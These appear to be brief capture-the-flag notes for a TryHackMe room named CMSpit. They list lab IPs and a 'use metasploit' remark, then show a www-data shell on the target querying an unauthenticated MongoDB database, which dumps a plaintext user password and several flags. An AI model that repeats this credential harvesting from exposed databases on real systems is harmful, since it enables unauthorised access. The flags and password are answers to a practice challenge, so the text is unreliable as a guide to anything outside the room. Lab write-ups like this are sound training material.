# CMSplit 

> VOiD | Monday 02 August 2021 10:58:12 AM IST

My IP : 10.17.6.109
Target IP : 10.10.16.141




use metasploit 

web flag : thm{f158bea70731c48b05657a02aaf955626d78e9fb}

```bash
www-data@ubuntu:/tmp$ mongo
MongoDB shell version: 2.6.10
connecting to: test
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
	http://docs.mongodb.org/
Questions? Try the support group
	http://groups.google.com/group/mongodb-user
2021-08-03T11:01:43.369-0700 In File::open(), ::open for '' failed with errno:2 No such file or directory
> show dbs
admin         (empty)
local         0.078GB
sudousersbak  0.078GB
> use sudousersbak
switched to db sudousersbak
> show collections
flag
system.indexes
user
> db.user.find()
{ "_id" : ObjectId("60a89d0caadffb0ea68915f9"), "name" : "p4ssw0rdhack3d!123" }
{ "_id" : ObjectId("60a89dfbaadffb0ea68915fa"), "name" : "stux" }
> db.flag.find()
{ "_id" : ObjectId("60a89f3aaadffb0ea68915fb"), "name" : "thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}" }

```
stux:p4ssw0rdhack3d!123
db flag : thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}

user stux
cat user.txt 
thm{c5fc72c48759318c78ec88a786d7c213da05f0ce}
